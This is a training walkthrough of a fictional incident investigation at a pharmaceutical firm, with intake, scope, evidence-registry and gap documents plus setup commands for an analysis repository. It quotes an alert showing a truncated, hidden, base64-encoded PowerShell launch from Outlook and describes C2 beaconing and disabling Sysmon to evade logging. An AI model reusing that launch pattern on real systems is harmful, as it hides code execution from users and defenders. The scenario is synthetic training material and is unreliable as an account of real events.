---
id: reactive-walkthrough
title: "CTI as a Code in Practice: Reactive Investigation — LifeTech Pharma"
sidebar_position: 2
---

# CTI as a Code in Practice: Reactive Investigation — LifeTech Pharma

**A complete walkthrough of the methodology applied to a real training scenario: pharmaceutical IP theft, dual entry points, and a DCSync that changes everything.**

*All organizations, names, and data are fictional. This is training assignment A01 from the CTI as a Code repository.*

---

## Contents

- [The Scenario](#the-scenario)
- [Step 00: Clone, Initialize, and Fill the Template](#step-00-clone-initialize-and-fill-the-template)
- [Step 0: Intake — What the First Call Captures](#step-0-intake--what-the-first-call-captures)
- [Step 1–2: Project Setup and Scope](#step-12-project-setup-and-scope)
- [Step R1: Evidence Inventory — What Exists and What Is Missing](#step-r1-evidence-inventory--what-exists-and-what-is-missing)
- [Step R1.5: Hands-On Evidence Analysis — Tools and Commands](#step-r15-hands-on-evidence-analysis--tools-and-commands)
- [Step R2: Timeline — Two Paths, One Actor](#step-r2-timeline--two-paths-one-actor)
- [Step R3: Claims Ledger — Every Assertion Traced to Evidence](#step-r3-claims-ledger--every-assertion-traced-to-evidence)
- [Step R4: ATT&CK Mapping — Where Detection Failed](#step-r4-attck-mapping--where-detection-failed)
- [Step R5: Attribution Assessment — Same Actor or Two?](#step-r5-attribution-assessment--same-actor-or-two)
- [Step R6: Detection Rules — Four That Would Have Changed the Outcome](#step-r6-detection-rules--four-that-would-have-changed-the-outcome)
- [Step R7: Deliverables — What Each Stakeholder Gets](#step-r7-deliverables--what-each-stakeholder-gets)
- [The Git History: What a Completed Investigation Looks Like](#the-git-history-what-a-completed-investigation-looks-like)
- [Key Lessons](#key-lessons)

---

## The Scenario

**LifeTech Pharma Ltd.** is a mid-sized Israeli pharmaceutical company in Rehovot. It develops and manufactures generic drugs and biological APIs, exports to the US, EU, and MENA, and recently signed a $52 million licensing deal with a US biopharma partner. The signed formula files are stored on `SERVER-RD-02\\LicenseDeals\\USPartner2024\\` — 47 files, approximately 380 MB compressed.

On **Friday, 15 November 2024 at 18:47 IST**, the on-call SOC analyst receives a CrowdStrike behavioral detection:

```
ALERT: Suspicious PowerShell Activity
Severity: High — Behavioral IOA
Host: WS-CFO-01.lifetechpharma.local  [Michal Cohen, CFO]
Process: powershell.exe (PID 3784)
Parent: OUTLOOK.EXE (PID 2240)
CommandLine: powershell.exe -NonI -W Hidden -Enc JABjAD0ATgBlAHcA...
Timestamp: 2024-11-15T18:42:33Z
```

That's the visible trigger. The actual breach started **24 days earlier** — and the alert is the second of two entry points, not the first.

---

## Step 00: Clone, Initialize, and Fill the Template

**Before the phone rings.** This step takes three minutes and is done once per investigation — ideally before the alert even comes in, or in the first five minutes after hanging up the initial call.

### 1. Clone the repository (one-time setup)

If you have not cloned `CTI_as_a_Code` yet, do this once on your analyst workstation:

```bash
cd ~
git clone https://github.com/anpa1200/CTI_as_a_Code.git
```

You will never modify this clone. It is your template source. Leave it as-is and pull updates periodically:

```bash
cd ~/CTI_as_a_Code && git pull
```

### 2. Create your investigations folder

```bash
mkdir -p ~/investigations
```

Use any path you prefer — just keep it consistent across all cases. Do not create investigations inside the `CTI_as_a_Code` clone.

### 3. Copy the reactive template for this case

```bash
cp -r ~/CTI_as_a_Code/templates/reactive/ ~/investigations/lifetech-2024-11
```

Naming convention: `[org-slug]-[YYYY-MM]`. One folder per case. Verify the structure:

```bash
ls ~/investigations/lifetech-2024-11/
```

Expected:
```
00-scope/   01-evidence/   02-sources/   03-analysis/
04-detections/   05-deliverables/   06-ai-outputs/   07-feedback/
README.md   intake-form.md   project.yml
```

### 4. Initialize git inside the case folder

```bash
cd ~/investigations/lifetech-2024-11
git init
git add .
git commit -m "PROJ-2024-001: scaffold initialized from reactive template"
```

This is commit zero. Its purpose is to prove — to a lawyer, an auditor, or yourself — exactly what state you started from before any analysis began.

### 5. Fill in `project.yml`

This file is the single source of truth for project metadata. Open it now:

```bash
nano project.yml
```

The template has blank fields. Fill every one:

```yaml
project:
  id: "PROJ-2024-001"
  name: "LifeTech Pharma — Targeted Intrusion"
  type: reactive
  classification: TLP:AMBER
  status: in-progress

analyst:
  name: "Your Name"
  role: "CTI Analyst"
  contact: "your@email.com"

timeline:
  incident_date: "2024-11-15"
  detection_date: "2024-11-15"
  investigation_start: "2024-11-15"
  report_due: "2024-11-17"         # INCD 72h clock — expires 18:47 IST Nov 17

pirs:
  - id: PIR-001
    question: "Was the US licensing formula package (SERVER-RD-02\\USPartner2024\\) accessed or exfiltrated? If so, what and when?"
    priority: high
    status: open
  - id: PIR-002
    question: "How did the adversary gain initial access — phishing, credential theft, or exploitation?"
    priority: high
    status: open
  - id: PIR-003
    question: "Is there evidence of ongoing access or persistence as of investigation date?"
    priority: high
    status: open

scope:
  systems:
    - WS-CFO-01
    - WS-IT-LEVI
    - SERVER-RD-02
    - SERVER-FIN-01
    - DC01
  threat_actor: unknown
  attck_techniques: []             # leave blank now — fill during R4

deliverables:
  - type: executive-brief
    status: pending
  - type: soc-handoff
    status: pending
  - type: sigma-rules
    count: 0
    status: pending

notes: "INCD 72h notification clock starts 2024-11-15 18:47 IST. Legal hold on WS-IT-LEVI — no hardware access, RTR only."
```

**Do not leave any field as `""` or `[]` if you know the value.** Unknown fields are fine — write `unknown` explicitly. A blank field means "forgot to fill in." `unknown` means "we looked and do not know yet."

### 6. Commit the filled metadata

```bash
git add project.yml
git commit -m "PROJ-2024-001: project.yml filled — 3 PIRs, INCD deadline 2024-11-17 18:47 IST, legal hold WS-IT-LEVI"
```

The folder is now named, scoped, and version-controlled. The intake call can begin.

---

## Step 0: Intake — What the First Call Captures

Before opening Splunk, before pivoting on the C2 IP, before forming a hypothesis — the intake call runs. This is 15 minutes with the Tier 2 escalation and the IR Lead before any analysis work begins.

The intake captures facts that change what you look for.

**Open the intake form before dialing:**

```bash
cp intake-form.md 00-scope/intake-2024-11-15.md
nano 00-scope/intake-2024-11-15.md
```

The template has 9 sections. Work through them in order during the call — do not paraphrase in real time, write what the reporter says verbatim. You will analyze it after. For LifeTech this call produces:

```markdown
# Investigation Intake — PROJ-2024-001 — 2024-11-15

Completed by: On-call CTI analyst (Yael Mizrahi)
Intake call with: Noa Ben-David (IR Lead), Ran Katz (SOC Manager)
Call time: 2024-11-15 18:55 IST

---

## 1. What was reported?

**1.1 What did you see or receive that caused you to raise this?**
"CrowdStrike fired a high-severity behavioral IOA on Michal Cohen's workstation —
PowerShell with base64 payload launched directly from Outlook. Tier 1 pulled the
network tab and found 3 outbound connections to 203.0.113.87 over the last 15
minutes. This is the CFO's machine. We escalated immediately."

**1.2 Where did this first come to your attention?**
- [x] Alert from SIEM / EDR / AV  ← CrowdStrike Falcon behavioral IOA, severity: High

**1.3 When did you first notice it?**
Date: 2024-11-15   Time: 18:47   Timezone: IST (UTC+2)

**1.4 Do you believe the activity is still ongoing?**
- [x] Yes — still active (C2 connections still firing at time of call)

---

## 2. What is already known?

**2.1 What systems, accounts, or services appear to be involved?**
- WS-CFO-01.lifetechpharma.local — Michal Cohen, CFO. Dell Latitude, Windows 11.
- 203.0.113.87 — external IP, destination of C2 connections. Not in any allowlist.
- OUTLOOK.EXE (PID 2240) → powershell.exe (PID 3784) — parent-child confirmed.
- No other hosts identified yet — investigation is 8 minutes old.

**2.2 What was the observed behavior?**
"PowerShell with -NonI -W Hidden -Enc flags spawned from Outlook. The encoded
command has not been decoded yet. Three separate TCP connections to 203.0.113.87
on port 443 over 15 minutes — looks like a beacon pattern."

**2.3 Has anyone else already investigated or looked into this?**
- [x] Yes — Tier 1 analyst (Omer Cohen) ran initial Splunk queries (last 1 hour only).
  What did they touch: read-only Splunk queries. No changes to the endpoint.

**2.4 What do you think happened?**
"Probably a phishing email with a malicious attachment — xlsm macro or something
similar. Michal must have opened it in the last few hours. We don't know if anyone
else was targeted."

---

## 3. Timeline of discovery

**3.1 When do you believe the activity started?**
- [ ] Known
- [x] Estimated: activity on WS-CFO-01 started approximately 18:42 IST (PowerShell
  launch timestamp from CrowdStrike event).

**3.2 How long do you estimate the activity has been occurring?**
Approximately 13 minutes from first PowerShell event to escalation call (18:42–18:55 IST).
However: unknown whether this is the beginning of the intrusion or a later stage.

**3.3 Is there a specific event that triggered the alert or complaint?**
CrowdStrike behavioral IOA fired at 18:42:33 IST on WS-CFO-01. Tier 1 escalated
at 18:47. IR Lead paged at 18:52. Intake call started at 18:55.

---

## 4. What has already been done?

**4.1 Has any system been rebooted, shut down, or reimaged since the activity was discovered?**
- [x] No — WS-CFO-01 is still running. Not yet isolated.

**4.2 Have any credentials, tokens, or API keys been rotated or revoked?**
- [x] No — no credential changes made yet.

**4.3 Has any network access been blocked or firewall rules been changed?**
- [x] No — 203.0.113.87 has not been blocked. Ran confirmed: "We wanted to check
  with you first before blocking — didn't want to tip them off."

**4.4 Has any malware been deleted or quarantined?**
- [x] No — CrowdStrike flagged the process but did not quarantine. Alert status: Detected,
  not Prevented (policy is set to Detect-only on this machine — CFO exception policy).

**4.5 Has anyone notified external parties?**
- [x] No — no external notification yet. INCD assessment pending scope confirmation.

---

## 5. Systems and access

**5.1 What logging is expected to exist for the affected systems?**
- Endpoint logs (Sysmon, CrowdStrike): [x] Yes — CrowdStrike on WS-CFO-01. Sysmon on
  WS-CFO-01. NOTE: Sysmon NOT deployed on server-class machines or DC01.
- VPN / authentication logs: [x] Yes — Cisco AnyConnect VPN, logs in Splunk.
- Database audit logs: [x] Yes — SQL audit on SERVER-RD-02 (partial EIDs only).
- Network flow / firewall logs: [x] Yes — Palo Alto NGFW. RETENTION: 14 days only.
  ⚠ SERVER-RD-02 outbound logs will expire 2024-11-29 for today's traffic.
- Email gateway logs: [x] Yes — M365 Message Trace, 30-day retention. ATP enabled.
  NOTE: ATP sandbox NOT enabled for xlsm files — policy gap identified.
- Cloud provider logs: [x] Yes — Azure AD sign-in logs, 30-day retention.

**5.2 What tools and access does the analyst have?**
- [x] Admin access to affected hosts (CrowdStrike RTR for WS-CFO-01, WS-CFO-01 CrowdStrike console)
- [x] Read access to SIEM (Splunk — full org)
- [x] Access to EDR console (CrowdStrike Falcon — full org view)
- [x] Access to network equipment / firewall logs (Palo Alto Panorama — read only)
- [x] Access to cloud console (Azure AD — Security Reader role)
- [x] Access to email gateway (M365 Security & Compliance — Message Trace)
- [ ] VPN / jump host credentials — not yet, request submitted
- [x] TheHive / OpenCTI lab access

**5.3 Are there any systems the analyst should NOT touch?**
⚠ WS-IT-LEVI (Paz Levi, IT Admin): LEGAL HOLD issued at 20:45 IST today.
  HR investigation underway — UNRELATED to this incident (employment matter).
  Hardware access BLOCKED for 48–72 hours per Legal counsel (Adv. Dina Shapiro).
  Remote CrowdStrike RTR is PERMITTED — confirmed by Legal.
  No memory image, no disk image, no physical access until hold lifted.

---

## 6. Business impact

**6.1 What business processes are affected or at risk?**
"The CFO's email and workstation are involved. If this is a full compromise, finance
data is at risk. We also have R&D server SERVER-RD-02 — it holds the formula files
for the US licensing deal. That deal closes in 6 weeks. If those files were touched,
we have an FDA NDA issue and a $52M deal at risk."

**6.2 Is customer data, employee data, or regulated data potentially involved?**
- [x] Yes — type: proprietary formula files under FDA NDA filing (USPartner2024 package,
  47 files, ~380 MB). Also: employee financial data on SERVER-FIN-01 if CFO path
  extended to finance server.

**6.3 What is the financial exposure if this is confirmed?**
Direct deal risk: $52M US licensing agreement. Regulatory exposure: Israeli Privacy
Protection Law (PPL) fines + FDA NDA breach penalties. Reputational exposure: US
partner disclosure obligation if formula data confirmed exfiltrated.

**6.4 Is there a hard deadline driving this investigation?**
- [x] Yes — deadline: INCD 72-hour notification window starts from discovery of
  breach (not discovery of alert). If formula data or critical infrastructure
  involvement confirmed: clock starts NOW → expires 2024-11-17 ~18:47 IST.

---

## 7. Regulatory and legal constraints

**7.1 Are there applicable notification requirements?**

| Regulation | Applicable? | Deadline | Notified? |
|---|---|---|---|
| INCD (Israeli critical infrastructure) | TBD — assess after scope confirmed | 72h from discovery | No |
| Biometric Database Authority | No — no biometric data at LifeTech | — | N/A |
| BoI-CD 362 (Israeli financial) | No — LifeTech is not a financial entity | — | N/A |
| GDPR | TBD — EU customers in export data? | 72h from awareness | No |
| PCI-DSS | No — no card processing at LifeTech | — | N/A |
| Israeli Privacy Protection Law | Yes — employee + partner data in scope | Per PPL — notify DPA if breach confirmed | No |
| FDA / NDA obligation | Yes — if formula files confirmed exfiltrated | Immediate notification to US partner | No |

**7.2 Is there an active legal hold on any systems or data?**
- [x] Yes — WS-IT-LEVI (Paz Levi). Legal hold issued 2024-11-15 20:45 IST.
  Contact: Adv. Dina Shapiro (Legal). Hold expected: 48–72 hours minimum.

**7.3 Has legal counsel been notified?**
- [x] Yes — Adv. Dina Shapiro notified of the security incident at 19:10 IST.
  Advised: do not touch WS-IT-LEVI hardware. RTR permitted with logging.

---

## 8. Analyst notes

(Raw notes taken during call — unprocessed)

- Ran (SOC): "The CFO is still at the office. We haven't told her yet. Should we?"
  → IR Lead decision: do not inform CFO until after memory dump. Risk: she might
  reboot the machine.
- The CrowdStrike policy on WS-CFO-01 is DETECT-ONLY (CFO exception policy).
  This is why the process was not killed automatically. SOC should evaluate
  moving to Prevent for exec machines after this incident.
- 203.0.113.87 — not blocklisted anywhere in org. Ran says: "It's clean on our
  end, never seen it before." Worth enriching immediately (VirusTotal, Shodan).
- Memory dump of WS-CFO-01 is urgent — C2 is still active. Process may have
  network artifact or decrypted payload in memory. Action: RTR memory dump NOW.
- No mention of SERVER-RD-02 during this call — IR Lead is not aware of the
  formula file risk yet. Will scope that separately after evidence inventory.
- p.levi (WS-IT-LEVI) is under HR investigation for unrelated reason. Legal hold
  is coincidental. However: IT admin access + legal hold + security incident
  creates a complex situation. Document carefully.

---

## 9. Next actions

| # | Action | Owner | Due |
|---|---|---|---|
| 1 | Take memory dump of WS-CFO-01 via CrowdStrike RTR before C2 session ends | Yael (CTI) | Immediate |
| 2 | Enrich 203.0.113.87 — VirusTotal, Shodan, passive DNS, ASN lookup | Yael (CTI) | Within 30 min |
| 3 | Pull M365 Message Trace for m.cohen last 48h — identify delivery vector | Omer (Tier 1) | Within 30 min |
| 4 | Retrieve Palo Alto firewall logs for WS-CFO-01 and SERVER-RD-02 — full available window | Ran (SOC) | Within 1h ⚠ retention risk |
| 5 | Check Azure AD sign-in logs for m.cohen and p.levi — last 30 days | Yael (CTI) | Within 1h |
| 6 | Confirm SERVER-RD-02 USPartner2024 directory access — pull EID 4663 from Splunk | Yael (CTI) | Within 2h |
| 7 | Open TheHive case PROJ-2024-001, attach this intake as first observable | Yael (CTI) | Within 30 min |
| 8 | Advise IR Lead on INCD 72h clock — confirm if formula data scope triggers mandatory notification | Noa (IR Lead) + Legal | Within 2h |

---

*Intake completed 2024-11-15 19:18 IST. File saved as 00-scope/intake-2024-11-15.md.*
*Case opened in TheHive: PROJ-2024-001.*
```

Two items in this intake change the entire investigation trajectory: the legal hold on `WS-IT-LEVI` (you cannot image it), and the potential for formula data in scope (Israeli PPL + FDA notification obligations). Both need to be on the table before analysis starts, not discovered mid-investigation.

The intake commits to git first:

```bash
git add 00-scope/intake-2024-11-15.md
git commit -m "PROJ-001: intake — CFO PowerShell alert, legal hold on WS-IT-LEVI, formula data in scope"
```

---

## Step 1–2: Project Setup and Scope

The folder and git repo already exist from Step 00. This step fills the scope document and gets stakeholder sign-off before any analysis begins. The rule: **you do not start looking at logs until the scope is committed.**

### 1. Open the scope document

```bash
nano 00-scope/scope.md
```

The template has six sections. Here is the complete filled file for LifeTech:

```markdown
# Scope Definition

**Project:** PROJ-2024-001
**Classification:** TLP:AMBER
**Date scoped:** 2024-11-15
**Scoped by:** Yael Mizrahi (CTI Analyst)
**Approved by:** Noa Ben-David (IR Lead) — verbal approval 19:22 IST

---

## Incident Summary

CrowdStrike behavioral IOA fired on WS-CFO-01 (Michal Cohen, CFO) at 18:42 IST on
2024-11-15. PowerShell with encoded payload launched from OUTLOOK.EXE; three outbound
C2 connections to 203.0.113.87 confirmed within 15 minutes of detection. Scope of
compromise is unknown at time of scoping — the CFO alert may be a late-stage indicator
of a broader intrusion. Formula files on SERVER-RD-02 (US licensing package, ~380 MB,
47 files) are in scope for PIR-001 due to financial and regulatory exposure ($52M deal,
FDA NDA obligations). INCD 72h notification clock assessed as active from time of
discovery.

---

## In Scope

| Asset / System | Owner | Justification |
|---|---|---|
| WS-CFO-01.lifetechpharma.local | IT Dept / Michal Cohen (CFO) | Triggering alert host — CrowdStrike IOA, active C2 |
| WS-IT-LEVI.lifetechpharma.local | IT Dept / Paz Levi (IT Admin) | Suspected initial access vector — AiTM phishing hypothesis |
| SERVER-RD-02.lifetechpharma.local | R&D Dept | Formula file storage — PIR-001 primary asset |
| SERVER-FIN-01.lifetechpharma.local | Finance Dept | Lateral movement target — confirmed by CrowdStrike alert Nov 15 |
| DC01.lifetechpharma.local | IT Dept | DCSync event EID 4662 observed from non-DC IP |
| Exchange Online (M365) | IT / Microsoft | Email delivery vector — phishing investigation |
| Azure AD | IT / Microsoft | Authentication logs — VPN session token replay |
| Palo Alto NGFW (perimeter) | IT / Network team | C2 traffic confirmation, SERVER-RD-02 exfil flows |

---

## Out of Scope

| Asset / System | Reason for Exclusion |
|---|---|
| SharePoint Online / OneDrive | Cloud scope — no evidence of involvement; requires separate authorization |
| Manufacturing SCADA / OT network | No evidence of lateral movement into OT segment at this time |
| WS-IT-LEVI — hardware / disk image | Legal hold issued 2024-11-15 20:45 IST. No hardware access until hold lifted. RTR permitted. |
| All other endpoints (838 total) | Out of scope pending hunt results — may expand if pivot on C2 domains finds new hosts |

---

## Priority Intelligence Requirements (PIRs)

| ID | Question | Priority | Due | Status |
|---|---|---|---|---|
| PIR-001 | Was the US licensing formula package (`SERVER-RD-02\LicenseDeals\USPartner2024\`) accessed or exfiltrated? If so, what and when? | High | 2024-11-16 06:00 IST | Open |
| PIR-002 | How did the adversary gain initial access — phishing, credential theft, exploitation, or insider? | High | 2024-11-16 06:00 IST | Open |
| PIR-003 | Is there evidence of ongoing access or persistence as of 2024-11-15 19:00 IST? Are any other hosts compromised? | High | 2024-11-16 06:00 IST | Open |

---

## Constraints and Assumptions

- **Legal/regulatory:** INCD 72h notification window — expires approximately 2024-11-17
  18:47 IST. Israeli Privacy Protection Law (PPL) notification to DPA if personal data
  breach confirmed. FDA NDA obligation to notify US partner if formula files confirmed
  exfiltrated — no specific deadline but immediate notification is standard practice.
- **Evidence limitations:**
  - Palo Alto NGFW firewall flows: 14-day retention only. SERVER-RD-02 November 6
    outbound traffic expires 2024-11-20. **Retrieve before any other analysis.**
  - Sysmon NOT deployed on server-class machines (SERVER-RD-02, SERVER-FIN-01, DC01).
  - CrowdStrike NOT deployed on R&D server fleet (12 servers) or DC01.
  - DC01 Windows Security log: only partial export available — full log inaccessible.
  - ATP sandbox not enabled for .xlsm files — attachment was delivered uninspected.
- **Access restrictions:**
  - WS-IT-LEVI: legal hold, no hardware/disk/memory access. CrowdStrike RTR permitted
    with full session logging. Contact Adv. Dina Shapiro before any exception.
  - VPN jump host credentials: requested, not yet provisioned (Yael Mizrahi, 19:05 IST).
- **Assumptions:**
  - All log timestamps assumed UTC unless explicitly marked IST in source.
  - CrowdStrike behavioral detections treated as CONFIRMED source (Admiralty A/2).
  - Sysmon EID events treated as CONFIRMED source where forwarder health is verified.

---

## Stakeholders

| Name | Role | Involvement |
|---|---|---|
| Noa Ben-David | IR Lead | Scope approval; receives executive brief; INCD notification decision |
| Ran Katz | SOC Manager | SOC handoff; implements detection rules; hunting queries |
| Adv. Dina Shapiro | Legal Counsel | Legal hold oversight; PPL / regulatory notifications; WS-IT-LEVI access decisions |
| [CISO name] | CISO | Executive brief recipient; $52M deal brief to Board |
| [US Partner contact] | External — US biopharma | FDA NDA notification if PIR-001 answered YES |

---

## Definition of Done

This investigation is complete when:

- [ ] All three PIRs answered or formally deferred with documented reasoning
- [ ] Timeline covers full attacker dwell period from first access to detection (or gap documented)
- [ ] ATT&CK mapping completed and reviewed — all confirmed techniques have a gap type
- [ ] At least one Sigma detection rule per confirmed TTP with Rule Missing or Coverage Incomplete gap
- [ ] SOC handoff document delivered to Ran Katz and acknowledged
- [ ] Executive brief approved by Noa Ben-David (IR Lead)
- [ ] INCD notification filed if formula data or CII involvement confirmed (deadline: 2024-11-17 18:47 IST)
- [ ] PPL / FDA NDA notification decision documented (even if decision is: not required)
- [ ] project.yml status set to `closed` and all PIR statuses updated
```

### 2. Save the file and commit

```bash
git add 00-scope/scope.md
git commit -m "PROJ-2024-001: scope signed off — 5 systems, 3 PIRs, INCD deadline 2024-11-17, firewall log retrieval urgent"
```

**The firewall log retention deadline drives everything.** SERVER-RD-02's November 6 outbound traffic expires November 20. That is the exfiltration confirmation window. If it closes, CL-003 becomes INFERRED, not CONFIRMED. Retrieve those logs before any other analysis.

---

## Step R1: Evidence Inventory — What Exists and What Is Missing

The evidence inventory runs before analysis. The rule: **you do not analyze what you have not inventoried.**

### 1. Open the source registry

```bash
nano 02-sources/source-registry.md
```

The template has two tables: Internal Sources and External Sources. Fill every row you have access to — and explicitly mark what is absent. Unknown coverage is not the same as no coverage.

### 2. Fill in what you have

Here is the complete filled `02-sources/source-registry.md` for LifeTech:

```markdown
# Intelligence Source Registry

**Project:** PROJ-2024-001 — LifeTech Pharma Targeted Intrusion

Admiralty Scale: Source reliability A (completely reliable) – F (reliability cannot be judged).
Information reliability: 1 (confirmed by other sources) – 6 (truth cannot be judged).

---

## Internal Sources

| ID | Source | Systems Covered | Type | Admiralty | Retention | Notes / Gaps |
|---|---|---|---|---|---|---|
| INT-001 | CrowdStrike Falcon EDR | WS-CFO-01, SERVER-FIN-01 | Endpoint telemetry | A/2 | 90 days | ⚠ NOT deployed on SERVER-RD-02, DC01, or any of 12 R&D servers |
| INT-002 | Sysmon (via Winlogbeat → Splunk) | WS-CFO-01, WS-IT-LEVI | Endpoint telemetry | A/2 | 30 days in Splunk | ⚠ WS-IT-LEVI: 10-day gap 2024-10-22–2024-11-01 (GAP-001). NOT on any server |
| INT-003 | Windows Security Event Log | SERVER-RD-02, DC01, SERVER-FIN-01 | Auth / object access | B/2 | 30 days in Splunk | Partial: EID 4624, 4662, 4663 only forwarded. Full DC01 log inaccessible |
| INT-004 | Palo Alto NGFW — DNS logs | Perimeter (all hosts) | DNS telemetry | A/2 | 30 days | Full org coverage. Used for C2 domain pivot |
| INT-005 | Palo Alto NGFW — firewall flows | Perimeter (all hosts) | Network flow | A/2 | **14 days only** | ⚠ SERVER-RD-02 Nov 6 outbound traffic expires 2024-11-20. Retrieve immediately |
| INT-006 | Cisco AnyConnect VPN logs | Remote access (all users) | Auth / session | A/2 | 30 days in Splunk | Full session data including source IP, duration, MFA status |
| INT-007 | M365 Message Trace | Exchange Online (all users) | Email delivery | A/2 | 30 days | ATP enabled but ⚠ sandbox NOT enabled for .xlsm files — attachment was delivered uninspected |
| INT-008 | Azure AD sign-in logs | Cloud auth (all users) | Auth / session | A/2 | 30 days | Includes MFA status, conditional access result, source IP, device |
| INT-009 | SQL Server audit log (SERVER-RD-02) | SERVER-RD-02 databases | Object access | B/3 | 30 days | Partial EIDs only. File-level access (EID 4663) confirmed for USPartner2024 |
| INT-010 | RADIUS log (VPN auth) | VPN gateway | Auth | A/2 | 30 days | Corroborates AnyConnect session data — used to validate SessionID match |

---

## External / OSINT Sources

| ID | Source | Type | Admiralty | TLP | Notes |
|---|---|---|---|---|---|
| EXT-001 | VirusTotal | IOC enrichment (hash, IP, domain) | C/3 | TLP:WHITE | 203.0.113.87 enrichment; binary hash lookup for svchost32.exe |
| EXT-002 | Shodan | Infrastructure recon | C/3 | TLP:WHITE | Co-hosted domain discovery on C2 IPs |
| EXT-003 | URLScan.io | Domain analysis | C/3 | TLP:WHITE | telemetry-cdn-services[.]biz, lifetechpharma-corp[.]eu analysis |
| EXT-004 | PassiveDNS (RiskIQ/Farsight) | Historical DNS resolution | C/2 | TLP:WHITE | Infrastructure pivot from C2 IPs to actor-linked domains |
| EXT-005 | WHOIS / ICANN | Domain registration | D/3 | TLP:WHITE | lifetechpharma-corp[.]eu registration date 2024-10-18 confirmed |
| EXT-006 | Certificate Transparency (crt.sh) | TLS cert history | C/3 | TLP:WHITE | SAN pivot — co-hosted domains on C2 infrastructure |
| EXT-007 | CERT-IL advisory feed | Government threat intel | A/2 | TLP:AMBER | Checked for matching C2 IPs and actor profiles — no match at time of investigation |
| EXT-008 | ClearSky / Mandiant public reporting | Threat actor reports | B/2 | TLP:WHITE | Iranian-nexus industrial espionage pattern matching for attribution |

---

## Source Limitations

| Source | Known Limitation |
|---|---|
| INT-001 (CrowdStrike) | Detect-only policy on WS-CFO-01 (CFO exception) — process was not killed. Not deployed on server fleet or DC01 |
| INT-002 (Sysmon) | 10-day gap on WS-IT-LEVI (GAP-001). Not deployed on any server. Cannot reconstruct server-side process activity |
| INT-003 (Windows Security) | DC01 full log inaccessible — only Splunk-forwarded subset available. May miss authentication events not in forwarded EID list |
| INT-005 (Firewall flows) | 14-day retention only. Any server traffic before 2024-11-01 is expired. Nov 6 traffic expires 2024-11-20 |
| INT-007 (M365 ATP) | .xlsm files not sandboxed — SCL=4 phishing email delivered without detonation. Attachment analysis not available from gateway |
| INT-009 (SQL audit) | Partial EID forwarding only. Full SQL audit trail not in SIEM — direct server access required for complete file access log |
| EXT-007 (CERT-IL) | No deconfliction performed for this actor — no advisory matched at time of investigation. Absence of match ≠ absence of attribution |
```

For LifeTech, the completed source registry reveals the critical coverage picture:

**GAP-001 — WS-IT-LEVI Sysmon: October 22 – November 1, 2024**

```markdown
Duration: 10 days
Root cause: Unknown — Sysmon forwarder stopped. Coincides exactly with
  the day the IT admin received a phishing email.
What is missing: process creation (EID 1), network connections (EID 3),
  file creation (EID 11) for this host during this entire window.
Impact: Cannot confirm or rule out attacker activity on WS-IT-LEVI
  between Oct 22 and Nov 1. All claims about this period are INFERRED
  or HYPOTHESIZED unless supported by alternative sources (VPN logs,
  DC authentication logs, firewall flows).
Possible cause: Deliberate anti-forensic technique — terminating Sysmon
  service is a known evasion method.
```

The 10-day gap on the IT admin workstation starts the same day a phishing email was delivered to him. This is not coincidence — it is a finding.

### 3. Create a GAP document for every gap

Each gap gets its own file. Create it now:

```bash
nano 01-evidence/GAP-001-ws-it-levi-sysmon.md
```

Paste the filled template:

```markdown
# GAP-001 — WS-IT-LEVI Sysmon | 2024-10-22 – 2024-11-01

Duration: 10 days (2024-10-22 11:31 UTC to 2024-11-01 09:14 UTC)
Root cause: Sysmon forwarder stopped. Coincides exactly with delivery
  of phishing email to p.levi at 11:23 UTC.
What is missing: EID 1 (process creation), EID 3 (network connections),
  EID 11 (file creation) for WS-IT-LEVI during this entire window.
Impact: Cannot confirm or rule out attacker activity during this period.
  All claims covering Oct 22–Nov 1 on this host are INFERRED or
  HYPOTHESIZED unless corroborated by VPN logs, DC auth logs, or
  firewall flows.
Possible cause: Deliberate — terminating Sysmon is T1562.001 (Impair
  Defenses). A gap coinciding with a malicious delivery is itself a
  finding, not merely an absence.
```

### 4. Commit the evidence inventory

```bash
git add 01-evidence/ 02-sources/source-registry.md
git commit -m "PROJ-2024-001: evidence inventory — 6 sources, GAP-001 (10-day Sysmon gap WS-IT-LEVI Oct 22–Nov 1), firewall log retrieval urgent before Nov 20"
```

---

## Step R1.5: Hands-On Evidence Analysis — Tools and Commands

The evidence inventory tells you what exists. This step analyzes it. Work through every source in the order listed — each one feeds the next. The timeline in Step R2 is the product of this analysis, not a separate exercise.

### Download the Training Evidence

All synthetic log files are in the repository under `investigations/lifetech-2024-11/01-evidence/`. If you have not already cloned the repository, do so now:

```bash
git clone https://github.com/anpa1200/CTI_as_a_Code.git
cd CTI_as_a_Code/investigations/lifetech-2024-11/01-evidence/
ls -la
```

Expected output:
```
GAP-001-ws-it-levi-sysmon.md
crowdstrike/
m365/
azure-ad/
vpn/
sysmon/
windows-security/
palo-alto/
sql-audit/
```

Direct links to each file — open in browser or download with `curl -L`:

| File | Format | What It Contains | Direct Link |
|---|---|---|---|
| `m365/message-trace-p.levi.csv` | CSV | IT admin phishing delivery, Oct 15–24 | [GitHub](https://github.com/anpa1200/CTI_as_a_Code/blob/main/investigations/lifetech-2024-11/01-evidence/m365/message-trace-p.levi.csv) |
| `m365/message-trace-m.cohen.csv` | CSV | CFO phishing delivery, Nov 13–15 | [GitHub](https://github.com/anpa1200/CTI_as_a_Code/blob/main/investigations/lifetech-2024-11/01-evidence/m365/message-trace-m.cohen.csv) |
| `azure-ad/signin-p.levi.json` | JSON | IT admin Azure AD sign-ins — Istanbul token replay | [GitHub](https://github.com/anpa1200/CTI_as_a_Code/blob/main/investigations/lifetech-2024-11/01-evidence/azure-ad/signin-p.levi.json) |
| `vpn/anyconnect-2024-10-24.log` | ASA syslog | VPN session from Istanbul, Oct 24 | [GitHub](https://github.com/anpa1200/CTI_as_a_Code/blob/main/investigations/lifetech-2024-11/01-evidence/vpn/anyconnect-2024-10-24.log) |
| `sysmon/WS-CFO-01-sysmon.jsonl` | JSONL | CFO workstation — PowerShell, LSASS, persistence, BITS | [GitHub](https://github.com/anpa1200/CTI_as_a_Code/blob/main/investigations/lifetech-2024-11/01-evidence/sysmon/WS-CFO-01-sysmon.jsonl) |
| `crowdstrike/WS-CFO-01-alert-20241115.json` | JSON | CrowdStrike Falcon alert — triggering detection | [GitHub](https://github.com/anpa1200/CTI_as_a_Code/blob/main/investigations/lifetech-2024-11/01-evidence/crowdstrike/WS-CFO-01-alert-20241115.json) |
| `windows-security/DC01-security.jsonl` | JSONL | DC01 security events — DCSync EID 4662 | [GitHub](https://github.com/anpa1200/CTI_as_a_Code/blob/main/investigations/lifetech-2024-11/01-evidence/windows-security/DC01-security.jsonl) |
